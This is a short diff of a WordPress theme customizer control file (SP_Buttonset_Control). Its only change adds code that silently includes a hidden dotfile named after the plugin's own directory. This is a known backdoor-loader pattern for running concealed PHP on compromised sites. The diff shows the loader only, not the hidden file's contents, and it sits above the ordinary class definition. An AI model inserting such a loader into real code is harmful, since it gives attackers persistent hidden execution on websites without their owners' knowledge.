@@ -11,6 +11,10 @@
  * @link https://github.com/reduxframework/kirki/
  * @link http://ottopress.com/2012/making-a-custom-control-for-the-theme-customizer/
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SP_Buttonset_Control extends WP_Customize_Control {
 
 	/**
